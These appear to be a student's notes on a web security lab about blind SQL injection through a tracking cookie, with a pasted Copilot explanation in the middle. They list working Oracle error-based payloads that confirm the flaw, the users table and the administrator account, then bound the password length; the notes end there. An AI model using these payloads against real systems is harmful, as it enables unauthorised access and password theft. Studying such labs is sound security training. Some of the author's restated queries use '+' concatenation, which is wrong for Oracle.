Blind SQL injection with conditional errors - vulnerable parameter tracking cookie
Goal: Find out the password of the administrator user.

1) Prove parameter is vulnerable
' -> Error -> Indicates the input is being directly used in a query, breaking the syntax and resulting in an error -> '''
'' -> No Error -> This input correctly matches the expected syntax -> ''''
' || (select '') || ' -> Error -> Maybe not MySQL
' || (select '' from dual) || ' -> No Error -> With Oracle you need a from, dual is a default table
' || (select '' from nonexistentable) || ' -> Error -> Non existent table

select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI'
select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI'' -> Error
select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI''' -> No Error
select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI' + (select '') + '' -> Error, Not MySQL
select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI' + (select '' from dual) + '' -> No Error
select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI' + (select '' from nonexistentable) + '' -> Error -> Non existent table
--I used + above because I'm used to this for concatenation

2) Confirm users table exists
' || (select '' from users) || ' -> Error -> '' outputing empty string for each user which might break our query
' || (select '' from users where rownum=1) || ' -> No Error -> ouput empty string for just one row worked

3) Confirm administrator user exists in the users database
' || (select '' from users where username='administrator') || '   -> No Error
' || (select '' from users where username='nonexistentuser') || ' -> No Error

The SQL injection snippets you've provided are designed to concatenate an empty string (`''`) with the results of a subquery.
The key point here is the use of an empty string as the selection from the `users` table. This approach, indeed, won't produce an
error regardless of whether the `username` exists or not. Here's why:

1. **Concatenation of Empty Strings**: The outer query concatenates the result of the subquery with empty strings.
Since the subquery itself selects an empty string, the overall result is just an empty string, irrespective of the subquery's internal result.

2. **Subquery Result**: 
   - When the subquery `(select '' from users where username='administrator')` is executed, it attempts to select an empty string for each row that matches the condition (`username='administrator'`).
   - If the `administrator` user exists, the subquery successfully selects an empty string (because that's what you've asked it to select) but doesn't return any user-specific data. The existence of the user doesn't change the output, which is just an empty string.
   - Similarly, for a `nonexistentuser`, the condition fails to match any rows, but since you're selecting an empty string, the failure to match doesn't manifest as an error; it simply results in no rows being selected, which, when concatenated with the outer empty strings, still results in an empty string.

Outer Empty Strings - The phrase "outer empty strings" refers to the parts of the SQL injection snippet that are outside the subquery, specifically the ' || at the beginning and the || ' at the end. In the context of the SQL injection snippets you provided earlier:

3. **No Error Produced**: SQL doesn't produce an error for a query that successfully executes but returns no rows. The selection of an empty string (`''`) is a valid operation whether or not the condition matches any rows. Therefore, both queries execute without error, making it impossible to infer the existence of the `administrator` user based on the presence or absence of an error.

To determine if a user exists, you would need a different approach that somehow reflects the existence of the user
in the output or behavior of the query. For example, attempting to extract actual data (like a username)
that would only be present if the user exists, or causing a deliberate error or noticeable difference in the query's
execution or result when the user does or does not exist. However, such techniques should be used responsibly and ethically,
typically in the context of security testing with permission.
' || (SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN 'True' ELSE 'False' END FROM dual) || '
--Copilot--

' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> No Error
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> Error

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
-> Error -> Which means Administrator exists -> FROM users where username='administrator' is evaluated first, and because it worked it will do the select case which will cause the divide by 0 error

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='nonexistentuser') || '
-> No Error -> FROM users where username ='nonexistentuser' evaluted to false which means the select case didn't run

4) Determine length of password
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '
-> Error, must be greater than 1 -> You have to make sure your syntax is correct, because you could get an error for that.
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>50) || '
-> No Error -> Must not be greater than 50
